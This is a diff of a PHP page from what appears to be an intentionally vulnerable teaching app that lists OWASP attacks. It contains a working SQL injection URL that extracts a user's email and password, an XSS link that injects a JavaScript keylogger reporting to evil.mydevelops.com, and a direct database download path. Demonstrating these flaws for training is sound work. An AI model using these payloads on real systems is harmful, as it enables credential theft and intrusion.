@@ -4,8 +4,8 @@ include_once("init.php");
 $attacks = array();
 
 $attacks[0] = array(
-    "name" => "SQL Injection",
-    "description" => "Show email and password for a user with id 1",
+    "name" => "A1 - SQL Injection",
+    "description" => "Shows email and password for a user with id 1",
     "value" => "product.php?id=0' UNION SELECT 'bla', email as name, pw as description, 'bla' FROM users WHERE id=1 --",
     "attack" => "product.php?id=0%27%20UNION%20SELECT%20%27bla%27,%20email%20as%20name,%20pw%20as%20description,%20%27bla%27%20FROM%20users%20WHERE%20id=1%20%20--");
 
@@ -36,10 +36,17 @@ window.setInterval(function() {
 //$xss = trim(preg_replace('/\s\s+/', ' ', $xss));
 
 $attacks[1] = array(
-    "name" => "Cross-Site Scripting (XSS)",
-    "description" => "Steal your password on login site!",
-    "value" => "index.php?message=&lt;script&gt;XSS-SCRIPT&lt;/script&gt;<br> Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
+    "name" => "A3 - Cross-Site Scripting (XSS)",
+    "description" => "Steals password on login site!",
+    "value" => "index.php?message=&lt;script&gt;XSS-SCRIPT&lt;/script&gt;<br> XSS script contains javascript keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
     "attack" => "index.php?message=<script>".$xss."</script>"
+);
+
+$attacks[2] = array(
+    "name" => "A5 - Security Misconfiguration",
+    "description" => "Just downloads the entire SQLite Database",
+    "value" => "/db/database.sqlite",
+    "attack" => "/db/database.sqlite"
 );
 
 ?>
@@ -53,11 +60,16 @@ include_once("header.php");
 		<div class="card-panel">   
 			<h4>Make some nice attack</h4>  
             <table class=" highlight stripped responsive-table listing">
-                
+                <thead>
+                    <tr>
+                        <th>OWASP Security risk</th>
+                        <th>What it does</th>
+                        <th>How it does it</th>  
+                    </tr>
                 <tbody>
                     <?php foreach($attacks as $attack): ?>
                         <tr>
-                            <td><?php echo $attack['name']; ?></td>
+                            <td><b><?php echo $attack['name']; ?></b></td>
                             <td><?php echo $attack['description']; ?></td>
                             <td><?php echo $attack['value'];?></td>
                             <td><a class="waves-effect waves-light btn btn-small red darken-2" href="<?=$attack['attack']?>" rel="_target">Attack!</a</td>
